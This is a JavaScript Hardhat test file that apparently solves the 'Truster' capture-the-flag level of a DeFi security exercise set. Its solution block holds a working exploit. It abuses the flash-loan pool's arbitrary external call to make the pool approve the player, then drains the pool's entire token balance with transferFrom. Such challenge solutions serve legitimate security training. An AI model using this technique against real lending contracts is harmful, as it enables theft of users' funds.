const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  let deployer, player;

  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    const DamnValuableToken = await ethers.getContractFactory(
      "DamnValuableToken",
      deployer
    );
    const TrusterLenderPool = await ethers.getContractFactory(
      "TrusterLenderPool",
      deployer
    );

    this.token = await DamnValuableToken.deploy();
    this.pool = await TrusterLenderPool.deploy(this.token.address);

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(
      TOKENS_IN_POOL
    );

    expect(await this.token.balanceOf(player.address)).to.equal("0");
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    // create malicious bytes data that approves player of spending pool's tokens
    let ABI = ["function approve(address spender, uint256 amount)"];
    let iface = new ethers.utils.Interface(ABI);
    const data = iface.encodeFunctionData("approve", [
      player.address,
      TOKENS_IN_POOL,
    ]);

    // check allowance before, should be 0
    const allowanceBefore = await this.token.allowance(
      this.pool.address,
      player.address
    );
    console.log("allowanceBefore:", allowanceBefore);

    // call flashloan, insert malicious bytes data
    await this.pool
      .connect(player)
      .flashLoan(0, player.address, this.token.address, data);

    // check allowance after, should be entire balance
    const allowanceAfter = await this.token.allowance(
      this.pool.address,
      player.address
    );
    console.log("allowanceAfter:", allowanceAfter);

    // call transferFrom function of token contract to send pool's tokens to player
    await this.token
      .connect(player)
      .transferFrom(this.pool.address, player.address, TOKENS_IN_POOL);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await this.token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
  });
});
